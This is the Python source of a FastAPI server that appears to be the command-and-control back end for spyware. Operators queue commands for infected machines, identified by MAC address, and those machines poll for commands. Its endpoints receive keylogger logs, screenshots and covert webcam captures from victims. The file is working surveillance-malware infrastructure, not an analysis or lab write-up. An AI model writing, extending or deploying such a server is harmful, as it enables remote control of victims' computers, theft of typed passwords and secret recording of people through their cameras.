__author__ = 'Tomer Gibor'

import os
from typing import Dict, List, Union
from http import HTTPStatus

import uvicorn
from fastapi import FastAPI, Request, Form, Depends, HTTPException
from fastapi.responses import HTMLResponse
from fastapi.security import HTTPBasicCredentials

from security import verify_credentials
from db_utils import DBHandler
from handle_clients import handle_command_request, handle_first_command, upload_file
from consts import DBIdentifiers, HTTPHeaders

app = FastAPI()
db_handler = DBHandler()


@app.get('/')
async def root(credentials: HTTPBasicCredentials = Depends(verify_credentials)) -> HTMLResponse:
    with open('source_files/index.html', 'r') as file:
        return HTMLResponse(file.read())


@app.get('/add_commands.html')
async def add_commands_html(credentials: HTTPBasicCredentials
                            = Depends(verify_credentials)) -> HTMLResponse:
    with open('source_files/add_commands.html', 'r') as file:
        return HTMLResponse(file.read())


@app.get('/view_clients.html')
async def view_clients(credentials: HTTPBasicCredentials
                       = Depends(verify_credentials)) -> HTMLResponse:
    with open('source_files/view_clients.html', 'r') as file:
        return HTMLResponse(file.read())


@app.get('/db.json')
async def db_json(credentials: HTTPBasicCredentials = Depends(verify_credentials)) \
        -> Dict[str, Dict[str, Union[int, str, List[str]]]]:
    return db_handler.serialize_db()


@app.post('/add_commands')
async def add_commands(credentials: HTTPBasicCredentials = Depends(verify_credentials),
                       mac_address: str = Form(default=None),
                       commands: str = Form(default="")) -> HTMLResponse:
    parsed_commands = [cmd.strip() for cmd
                       in commands.split(',')
                       if not cmd.isspace()]
    db_handler.add_commands(mac_address, parsed_commands)
    db_handler.update_db()
    with open('source_files/commands_added.html', 'r') as file:
        return HTMLResponse(file.read())


@app.get('/first_command')
async def first_command(request: Request) -> Union[Dict[str, List[str]], HTTPException]:
    if HTTPHeaders.MAC not in request.headers:
        return HTTPException(status_code=HTTPStatus.NOT_FOUND)
    return handle_first_command(request)


@app.get('/command')
async def command(request: Request) -> Union[Dict[str, List[str]], HTTPException]:
    if HTTPHeaders.MAC not in request.headers:
        return HTTPException(status_code=HTTPStatus.NOT_FOUND)
    return handle_command_request(request)


@app.post('/keylog_data')
async def keylog(request: Request) -> Union[None, HTTPException]:
    if HTTPHeaders.MAC not in request.headers:
        return HTTPException(status_code=HTTPStatus.NOT_FOUND)
    await upload_file(request, 'log', DBIdentifiers.KEYLOG, 'txt', True)


@app.post('/screenshot')
async def screenshot(request: Request) -> Union[None, HTTPException]:
    if HTTPHeaders.MAC not in request.headers:
        return HTTPException(status_code=HTTPStatus.NOT_FOUND)
    # retrieve image file type
    file_type = request.headers[HTTPHeaders.CONTENT_TYPE].split('/')[1]
    await upload_file(request, 'screenshot', DBIdentifiers.SCREENSHOT, file_type)


@app.post('/webcam_capture')
async def webcam_capture(request: Request) -> Union[None, HTTPException]:
    if HTTPHeaders.MAC not in request.headers:
        return HTTPException(status_code=HTTPStatus.NOT_FOUND)
    # retrieve image file type
    file_type = request.headers[HTTPHeaders.CONTENT_TYPE].split('/')[1]
    await upload_file(request, 'webcam', DBIdentifiers.WEBCAM, file_type)


if __name__ == '__main__':
    uvicorn.run('main:app', host='0.0.0.0', port=int(os.environ.get("PORT", 30050)),
                workers=2, debug=True)
# uvicorn main:app --reload
